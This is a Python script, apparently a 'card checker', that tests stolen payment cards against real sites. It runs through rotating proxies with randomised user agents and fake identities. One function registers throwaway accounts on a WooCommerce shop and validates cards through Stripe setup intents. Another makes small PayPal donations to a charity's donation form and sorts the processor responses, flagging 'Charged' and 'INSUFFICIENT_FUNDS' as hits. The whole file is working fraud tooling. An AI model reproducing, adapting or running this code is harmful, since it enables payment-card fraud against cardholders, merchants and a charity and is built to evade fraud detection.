# ==================== gatet.py (يقرأ البروكسيات من ملف proxies.txt) ====================

import os, sys
import random
import requests, time, string, base64, json, re, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
from user_agent import generate_user_agent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== تحميل البروكسيات من ملف ====================
PROXIES_LIST = []

def load_proxies():
    """تحميل البروكسيات من ملف proxies.txt"""
    global PROXIES_LIST
    PROXIES_LIST = []
    try:
        with open('proxies.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, username, password = parts
                        proxy_url = f'http://{username}:{password}@{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
                    elif len(parts) == 2:
                        ip, port = parts
                        proxy_url = f'http://{ip}:{port}'
                        PROXIES_LIST.append({'http': proxy_url, 'https': proxy_url})
        print(f"[+] Loaded {len(PROXIES_LIST)} proxies from proxies.txt")
    except FileNotFoundError:
        print("[!] proxies.txt not found, running without proxies")
    except Exception as e:
        print(f"[!] Error loading proxies: {e}")

load_proxies()

def get_random_proxy():
    """إرجاع بروكسي عشوائي من القائمة"""
    if PROXIES_LIST:
        return random.choice(PROXIES_LIST)
    return None

def get_session_with_proxy():
    """إنشاء جلسة مع بروكسي عشوائي (إذا وجد)"""
    session = requests.Session()
    proxy = get_random_proxy()
    if proxy:
        session.proxies = proxy
    session.verify = False
    return session, proxy

# ================ إعدادات الديناميكية ================
def get_random_user_agent():
    """تجيب User-Agent عشوائي من المكتبة"""
    return generate_user_agent()

def generate_random_email(domain=None):
    """تولد إيميل عشوائي مع دومينات متعددة"""
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
    if not domain:
        domain = random.choice(domains)
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
    number = random.randint(10, 9999)
    return f"{name}{number}@{domain}"

def generate_random_name():
    """تولد اسم عشوائي"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    return random.choice(first_names), random.choice(last_names)

def generate_random_postal():
    """تولد رمز بريدي عشوائي (UK)"""
    postal_codes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ',
                    'YO18SU', 'CA56NA', 'PL28EQ', 'PR253NE', 'NE304QB']
    return random.choice(postal_codes)

def generate_random_phone():
    """تولد رقم تليفون عشوائي UK"""
    prefixes = ['077', '078', '079', '074', '075', '076']
    return f"{random.choice(prefixes)}{random.randint(1000000, 9999999)}"

# ================ الدوال الأساسية (مع دعم البروكسيات) ================

def brn6(ccx):
    ccx = ccx.strip()
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user = get_random_user_agent()
    r, proxy = get_session_with_proxy()
    if proxy:
        proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
        print(f"[*] Using proxy for brn6: {proxy_ip}")
    else:
        print(f"[*] No proxy, running directly")
    
    x = random.randrange(0, 9999)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/', headers=headers, timeout=20)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://calefs.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, timeout=20)
    
    nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://calefs.com',
        'referer': 'https://calefs.com/my-account/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = {
        'email': f'y7is61{x}{c}@{random.choice(["gmail.com", "yahoo.com", "hotmail.com"])}',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://calefs.com/',
        'wc_order_attribution_session_pages': '4',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data, timeout=20)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://calefs.com/my-account/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user
    }
    
    response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers, timeout=20)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://calefs.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, timeout=20)
    pay = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
    key = re.search(r'"key"\s*:\s*"([^"]+)"', response.text).group(1)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
    
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
    id = response.json()['id']
    
    headers = {
        'authority': 'calefs.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://calefs.com',
        'referer': 'https://calefs.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': pay,
    }
    
    response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
    if '"success":true,"data":{"status":"succeeded"' in response.text:
        return 'Approved'
    else:
        return 'declined'


# ==================== إعدادات الموقع الجديد (guinnovation.org) ====================
def generate_fake_data():
    """توليد بيانات وهمية للدفع"""
    first_names = ['James', 'Emma', 'Michael', 'Sophia', 'William', 'Olivia', 'Noah', 'Ava']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}{random.randint(100, 9999)}@gmail.com"
    return {
        "first_name": first,
        "last_name": last,
        "full_name": f"{first} {last}",
        "email": email,
        "card_name": f"{first} {last}"
    }

def pay(ccx):
    """
    دالة الفحص الرئيسية - مستوحاة من jo2.py
    تستخدم موقع guinnovation.org
    """
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return 'INVALID_FORMAT'
        
        number = parts[0]
        month = parts[1].zfill(2)
        year = parts[2]
        cvc = parts[3]
        
        if "20" in year:
            year = year.split("20")[1]
        else:
            year = year[-2:] if len(year) > 2 else year
        
        fake = generate_fake_data()
        s, proxy = get_session_with_proxy()
        user = get_random_user_agent()
        
        if proxy:
            proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
            print(f"[*] Using proxy for payment: {proxy_ip}")
        else:
            print(f"[*] No proxy, running directly")
        
        # الموقع الجديد من jo2.py
        url = 'https://guinnovation.org/donate/'
        url_iframe = 'https://guinnovation.org/give/donate/'
        url_ajax = 'https://guinnovation.org/wp-admin/admin-ajax.php'
        
        headers = {'user-agent': user}
        
        # 1. جلب الصفحة الرئيسية
        s.get(url, headers=headers, timeout=30)
        
        # 2. جلب صفحة iframe
        params = {'giveDonationFormInIframe': '1'}
        r = s.get(url_iframe, params=params, headers=headers, timeout=30)
        html = r.text
        
        # 3. استخراج البيانات
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', html).group(1)
        register_hash = re.search(r'name="give-form-user-register-hash"\s+value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', html).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', html).group(1)
        kol = base64.b64decode(enc_token).decode('utf-8')
        access_token = re.findall(r'"accessToken":"(.*?)"', kol)[0]
        
        print(f"[*] Got access token: {access_token[:50]}...")
        
        # 4. Create Order
        params_create = {'action': 'give_paypal_commerce_create_order'}
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Donate',
            'give-current-url': url,
            'give-form-url': url_iframe,
            'give-form-minimum': '0.60',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': '0',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '0.60',
            'give-recurring-period-donors-choice': 'month',
            'give_stripe_payment_method': '',
            'give_first': fake['first_name'],
            'give_last': fake['last_name'],
            'give_email': fake['email'],
            'give-form-user-register-hash': register_hash,
            'give-purchase-var': 'needs-to-register',
            'give_tributes_type': 'In honor of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In honor of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_eCard',
            'give_tributes_ecard_notify[recipient][personalized][]': '',
            'give_tributes_ecard_notify[recipient][first_name][]': '',
            'give_tributes_ecard_notify[recipient][last_name][]': '',
            'give_tributes_ecard_notify[recipient][email][]': '',
            'payment-mode': 'paypal-commerce',
            'card_name': fake['card_name'],
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
            'give_embed_form': '1',
        }
        
        r = s.post(url_ajax, params=params_create, headers=headers, data=data, timeout=30)
        order_id = r.json()['data']['id']
        print(f"[*] Order created: {order_id}")
        
        # 5. Confirm with PayPal API
        headers_paypal = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {access_token}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': number,
                    'expiry': f'20{year}-{month}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
               headers=headers_paypal, json=json_data, timeout=30)
        
        # 6. Approve Order
        params_approve = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
        r = s.post(url_ajax, params=params_approve, headers=headers, data=data, timeout=30)
        text = r.text.upper()
        
        # 7. تحليل الردود (مطابق لـ jo2.py)
        if '"STATUS":"COMPLETED"' in text and '"RESPONSE_CODE":"0000"' in text:
            return "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR"
        elif 'COMPLETED' in text:
            return "Approved No Charge"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS ✅"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED"
        elif 'INVALID_MERCHANT' in text:
            return "INVALID_MERCHANT"
        elif 'AMOUNT_EXCEEDED' in text:
            return "AMOUNT_EXCEEDED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT"
        else:
            return "DECLINED"
            
    except Exception as e:
        print(f"Payment error: {e}")
        return "ERROR"
